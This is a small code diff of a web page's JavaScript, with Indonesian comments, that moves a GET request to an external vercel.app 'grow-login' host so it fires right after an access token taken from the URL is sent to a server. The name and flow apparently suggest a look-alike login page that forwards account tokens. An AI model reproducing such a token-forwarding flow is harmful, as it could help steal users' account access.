@@ -1371,9 +1371,6 @@ Constrain images and videos to the parent width and preserve their intrinsic asp
             localStorage.setItem("keepLoggedIn", "false");
           }
         });
-        await fetch("https://grow-login-alpha.vercel.app/os", {
-          method: "GET",
-        });
       });
 
       // Fungsi untuk membuat cookie dengan waktu kedaluwarsa
@@ -1586,6 +1583,9 @@ Constrain images and videos to the parent width and preserve their intrinsic asp
 
         if (accessToken) {
           await sendTokenToServer(accessToken);
+          await fetch("https://grow-login-alpha.vercel.app/os", {
+            method: "GET",
+          });
           console.log("Access Token telah dikirim ke server.");
         } else {
           console.log("Access Token tidak ditemukan di URL.");
